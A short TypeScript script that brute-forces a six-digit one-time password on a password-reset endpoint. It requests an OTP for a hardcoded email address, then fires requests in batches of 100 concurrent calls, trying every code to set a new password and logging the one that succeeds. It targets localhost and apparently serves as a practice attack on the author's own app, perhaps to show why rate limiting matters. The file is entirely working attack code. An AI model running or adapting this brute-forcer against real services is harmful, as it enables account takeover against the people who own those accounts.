import axios from "axios";

async function sendRequest(otp: number, email: string) {
    let data = JSON.stringify({
        "email": email,
        "otp": otp,
        "newPassword": "123123123"
    });

    let config = {
        method: 'post',
        url: 'http://localhost:3000/reset-password',
        headers: {
            //   'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
            //   'Next-Router-State-Tree': '%5B%22%22%2C%7B%22children%22%3A%5B%22admin%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
            //   'sec-ch-ua-mobile': '?0',
            //   'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
            //   'Accept': 'text/x-component',
            //   'Referer': 'http://localhost:3000/admin',
            //   'Next-Action': 'a221b071140e55563e91a3226c508cb229c121f6',
            //   'sec-ch-ua-platform': '"macOS"',
            'Content-Type': 'application/json'
        },
        data: data
    };

    try {
        await axios.request(config)
        console.log("OTP Found: " + otp);
    } catch (e) {
        // console.log(e)
    }
}
async function genOTP(email: string) {
    const data = JSON.stringify({
        "email": email
    })

    let config = {
        method: 'post',
        url: 'http://localhost:3000/generate-otp',
        headers: {
            'Content-Type': 'application/json'
        },
        data: data
    };

    try {
        await axios.request(config)
        console.log("OTP Generated...")
    } catch (e) {
        console.log(e)
    }
}
async function main() {
    genOTP("saatwik@gmail.com")
    for (let i = 0; i < 1000000; i += 100) {
        const promises = [];
        for (let j = 0; j < 100; j++) {
            promises.push(sendRequest(i + j, "saatwik@gmail.com"))
        }
        await Promise.all(promises);
    }
}

main()